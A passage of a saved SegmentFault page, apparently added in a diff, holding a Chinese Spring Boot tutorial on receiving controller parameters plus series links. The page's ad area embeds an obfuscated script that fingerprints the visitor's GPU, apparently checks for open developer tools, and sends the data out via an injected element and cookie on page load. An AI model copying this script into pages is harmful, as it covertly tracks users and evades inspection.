+}</code></pre><h3 id="item-0-4">4 HttpServletRequest接收参数</h3><p>请求方式：localhost:7001/param/getRequest?id=18</p><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188244" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188244.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@GetMapping(&quot;getRequest&quot;)
+public String getRequest(HttpServletRequest request){
+    String id = request.getParameter(&quot;id&quot;);
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@GetMapping("getRequest")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getRequest</span><span class="hljs-params">(HttpServletRequest request)</span></span>{
+    String id = request.getParameter(<span class="hljs-string">"id"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
+}</code></pre><h3 id="item-0-5">5 @RequestBody接收请求体参数</h3><p>这种方式一般用来传递实体对象，加了这个注解后，参数也是必传的。</p><p>请求方式：{"id":18}</p><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188247" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188247.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@PostMapping(&quot;getBody&quot;)
+public String getBody(@RequestBody String id){
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@PostMapping("getBody")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getBody</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String id)</span></span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
+}</code></pre><h3 id="item-0-6">6 @RequestHeader接收请求头参数</h3><p>请求示例：</p><p><span class="img-wrap"><img class="lazy entered loaded" referrerpolicy="no-referrer" data-src="/img/remote/1460000025188246" alt="" title="" data-ll-status="loaded" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/1460000025188246.webp"></span></p><p>代码示例：</p><div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="@PostMapping(&quot;getHeader&quot;)
+public String getHeader(@RequestHeader String id){
+    return &quot;id=&quot;+id;
+}" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="java hljs"><code class="java"><span class="hljs-meta">@PostMapping("getHeader")</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getHeader</span><span class="hljs-params">(<span class="hljs-meta">@RequestHeader</span> String id)</span></span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"id="</span>+id;
+}</code></pre><hr><h4>本文示例代码已上传至<a target="_blank" href="https://github.com/binzh303/spring-boot-route">github</a>，点个<code>star</code>支持一下！</h4><h2 id="item-1">Spring Boot系列教程目录</h2><p><a href="https://javatip.cn/archives/66" rel="nofollow">spring-boot-route（一）Controller接收参数的几种方式</a></p><p><a href="https://javatip.cn/archives/72" rel="nofollow">spring-boot-route（二）读取配置文件的几种方式</a></p><p><a href="https://javatip.cn/archives/74" rel="nofollow">spring-boot-route（三）实现多文件上传</a></p><p><a href="https://javatip.cn/archives/79" rel="nofollow">spring-boot-route（四）全局异常处理</a></p><p><a href="https://javatip.cn/archives/90" rel="nofollow">spring-boot-route（五）整合swagger生成接口文档</a></p><p><a href="https://javatip.cn/archives/91" rel="nofollow">spring-boot-route（六）整合JApiDocs生成接口文档</a></p><p><a href="https://javatip.cn/archives/92" rel="nofollow">spring-boot-route（七）整合jdbcTemplate操作数据库</a></p><p><a href="https://javatip.cn/archives/93" rel="nofollow">spring-boot-route（八）整合mybatis操作数据库</a></p><p><a href="https://javatip.cn/archives/94" rel="nofollow">spring-boot-route（九）整合JPA操作数据库</a></p><p><a href="https://javatip.cn/archives/95" rel="nofollow">spring-boot-route（十）多数据源切换</a></p><p><a href="https://javatip.cn/archives/113" rel="nofollow">spring-boot-route（十一）数据库配置信息加密</a></p><p><a href="https://javatip.cn/archives/114" rel="nofollow">spring-boot-route（十二）整合redis做为缓存</a></p><p><a href="https://javatip.cn/archives/115" rel="nofollow">spring-boot-route（十三）整合RabbitMQ</a></p><p><a href="https://javatip.cn/archives/116" rel="nofollow">spring-boot-route（十四）整合Kafka</a></p><p><a href="https://javatip.cn/archives/117" rel="nofollow">spring-boot-route（十五）整合RocketMQ</a></p><p><a href="https://javatip.cn/archives/118" rel="nofollow">spring-boot-route（十六）使用logback生产日志文件</a></p><p><a href="https://javatip.cn/archives/119" rel="nofollow">spring-boot-route（十七）使用aop记录操作日志</a></p><p><a href="https://javatip.cn/archives/120" rel="nofollow">spring-boot-route（十八）spring-boot-adtuator监控应用</a></p><p><a href="https://javatip.cn/archives/121" rel="nofollow">spring-boot-route（十九）spring-boot-admin监控服务</a></p><p><a href="https://javatip.cn/archives/122" rel="nofollow">spring-boot-route（二十）Spring Task实现简单定时任务</a></p><p><a href="https://javatip.cn/archives/123" rel="nofollow">spring-boot-route（二十一）quartz实现动态定时任务</a></p><p><a href="https://javatip.cn/archives/124" rel="nofollow">spring-boot-route（二十二）实现邮件发送功能</a></p><p><a href="https://javatip.cn/archives/125" rel="nofollow">spring-boot-route（二十三）开发微信公众号</a></p><p><a href="https://javatip.cn/archives/284" rel="nofollow">spring-boot-route（二十四）分布式session的一致性处理</a></p><p><a href="https://javatip.cn/archives/256" rel="nofollow">spring-boot-route（二十五）两行代码实现国际化</a></p><p><a href="https://javatip.cn/archives/255" rel="nofollow">spring-boot-route（二十六）整合webSocket</a></p><p>这个系列的文章都是工作中频繁用到的知识，学完这个系列，应付日常开发绰绰有余。如果还想了解其他内容，扫面下方二维码告诉我，我会进一步完善这个系列的文章！ </p><p><span class="img-wrap"><img class="lazy" referrerpolicy="no-referrer" data-src="/img/remote/1460000037585414" alt="" title=""></span></p></article><div class="d-flex flex-wrap align-items-center "><div class="m-n1"><a href="https://segmentfault.com/t/springboot" class="m-1 badge-tag">springboot</a><a href="https://segmentfault.com/t/java" class="m-1 badge-tag">java</a></div></div><div class="my-4"><div id="OA_holder_3" class="ad-container" style="display:block"><div class="d-none d-lg-flex justify-content-center">
+<script async="" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/adsbygoogle.js"></script>
+<!-- 中部横幅广告位 -->
+<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-6330872677300335" data-ad-slot="5598290435" data-adsbygoogle-status="done" data-ad-status="filled"><ins id="aswift_0_expand" style="border: medium none; height: 90px; width: 728px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-table;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_0_anchor" style="border: medium none; height: 90px; width: 728px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: block;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:728px;height:90px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/ads.htm" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-google-query-id="CNuV94z8-vACFYsOvAodO1sF0A" data-load-complete="true" width="728" height="90" frameborder="0"></iframe></ins></ins></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script><div id="beacon_e2f5e74c51" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_006.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div class="text-secondary font-size-14 mt-3 mb-5 d-flex justify-content-between row"><div class="col"><span>阅读 <!-- -->1k</span><span class="split-dot"></span><time datetime="2020-10-02T11:30:55.000Z" itemprop="datePublished">更新于 <!-- -->5 月 8 日</time></div><div class="operation col-6 text-right col-xs-3 col"><div></div></div></div><div class="functional-area-bottom text-center"><div role="group" class="btn-group like-group align-items-center btn-group"><button type="button" class="btn mr-2 rounded btn btn-outline-primary"><i class="far fa-thumbs-up"></i><span class="ml-1">赞</span><span class="mainLikeNum ml-1">10</span></button><button type="button" class="btn mr-2 rounded btn btn-outline-secondary"><i class="far fa-bookmark"></i><span class="ml-1">收藏</span><span class="ml-1">7</span></button><div class="bottom-share-wrap dropdown"><a href="###" class="nav-tab-item  btn d-flex justify-content-center align-items-center dropdown-toggle" aria-label="分享"><button type="button" class="btn rounded btn btn-outline-secondary"><i class="far fa-share-alt"></i><span class="ml-1">分享</span></button></a></div></div></div><canvas class="qrcode" hidden=""></canvas><div class="font-size-14 text-secondary text-center mt-3 mb-5"><span>本作品系原创，</span><a target="_blank" rel="noreferrer" class="text-secondary" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">采用《署名-非商业性使用-禁止演绎 4.0 国际》许可协议</a></div></div></div><div class="d-block d-xl-none mt-sm-4"><div class="mb-4 card"><div class="card-body"><div class="d-flex align-items-center mb-3"><picture class="rounded-circle mr-3"><a href="https://segmentfault.com/u/javatrip"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/2295617052-5ebaac9a8df71_huge128.webp" alt="avatar" class="rounded-circle" width="64" height="64"></a></picture><div><h5 class="mb-0"><a href="https://segmentfault.com/u/javatrip" class="text-body">Java旅途</a></h5></div></div><div class="d-flex align-items-center mb-3"><div class="mr-4"><strong>987</strong><span class="text-secondary"> 声望</span></div><div><strong>6.1k</strong><span class="text-secondary"> 粉丝</span></div></div><button type="button" class="btn btn-primary btn-block">关注作者</button></div></div></div><div><div id="comment-area" class="comment-wrap  card"><div class="d-flex align-items-center justify-content-between bg-transparent card-header"><h5 class="mb-0">0<!-- --> 条评论</h5><div aria-label="Basic" role="group" class="btn-group"><a href="https://segmentfault.com/a/1190000025188239?sort=votes" class="btn btn-secondary btn-sm">得票数</a><a href="https://segmentfault.com/a/1190000025188239?sort=newest" class="btn btn-outline-secondary btn-sm">最新</a></div></div><div class="card-body"><div tabindex="1" class="mb-4 media"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/3179314346-5f61e47221e07.webp" class="rounded-circle mr-3" aria-hidden="true" width="38"><div class="media-body"><div class="form-group"><div class="mentions-wrap dropdown"><textarea rows="1" placeholder="撰写评论 …" aria-label="评论" class="comment-text form-control" style="overflow: hidden; overflow-wrap: break-word; resize: none; height: 38px;"></textarea><div class="dropdown-toggle"></div></div><div class="invalid-feedback"></div></div><div class="d-flex justify-content-end align-items-center"><a href="###" class="mr-3" aria-label="提示" tabindex="-1"><i class="far fa-info-circle text-secondary"></i></a><button disabled="disabled" type="button" class="float-right btn btn-primary">提交评论</button></div></div></div><div class="comment-body-wrap d-none"></div></div></div></div><div class="bg-white text-center border border-dark border-width-2 p-5 my-4 rounded"><div class="h1">你知道吗？</div><p class="my-4" style="font-size:1.25rem">代码写得越急，程序跑得越慢。</p><button style="width:178px" type="button" class="btn btn-primary btn-lg">注册登录</button></div><div class="mt-4 card"><h5 class="bg-transparent card-header">继续阅读</h5><div class="recommend-list-wrap list-group"><div class="card border-0"><div class="list-group list-group-flush"><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000025216719?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（三）实现多文件上传</h5><p class="mb-2 text-truncate text-secondary">单个文件上传使用MultipartFile参数来接收文件，多文件使用MultipartFile[]数组来接收，然后遍历它，当成单文件来处理。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 875</span><span class="split-dot"></span><span>5 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000027074004?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（四）全局异常处理</h5><p class="mb-2 text-truncate text-secondary">在开发中，我们经常会使用try/catch块来捕获异常进行处理，如果有些代码中忘记捕获异常或者不可见的一些异常出现，就会响应给前端一些不友好的提示，这时候我们可以使用全局异常处理。这样就不用在代码中写那些烦...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 907</span><span class="split-dot"></span><span>5 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000037567462?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（二十二）实现邮件发送功能</h5><p class="mb-2 text-truncate text-secondary">在项目开发中，除了需要短信验证外，有时候为了节省 短信费也会使用邮件发送。在Spring项目中发送邮件需要封装复杂的消息体，不太方便。而在Spring Boot项目中发送邮件就太简单了，下面一起来看看Spring Boot如何...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 660</span><span class="split-dot"></span><span>4 赞</span><span class="split-dot"></span><span>2 评论</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000025190222?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（二）读取配置文件的几种方式</h5><p class="mb-2 text-truncate text-secondary">Spring Boot提供了两种格式的配置文件，分别是properties 和 yml。Spring Boot最大的特点就是自动化配置，如果我们想修改自动化配置的默认值，就可以通过配置文件来指定自己服务器相关的参数。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 665</span><span class="split-dot"></span><span>4 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000037534731?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（二十）Spring Task实现简单定时任务</h5><p class="mb-2 text-truncate text-secondary">Spring Task是Spring 3.0自带的定时任务，可以将它看作成一个轻量级的Quartz，功能虽然没有Quartz那样强大，但是使用起来非常简单，无需增加额外的依赖，可直接上手使用。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 444</span><span class="split-dot"></span><span>2 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000037511841?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（十八）spring-boot-adtuator监控应用</h5><p class="mb-2 text-truncate text-secondary">Spring Boot提供了良好的服务监控模块，只需要通过简单的配置便可以完成服务监控和管理。但是服务监控这块内容往往是最容易被忽略的一块内容，今天我们一起来学习一下使用spring-boot-actuator进行服务监控。spri...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 546</span><span class="split-dot"></span><span>2 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000027086907?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（八）整合mybatis操作数据库</h5><p class="mb-2 text-truncate text-secondary">MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 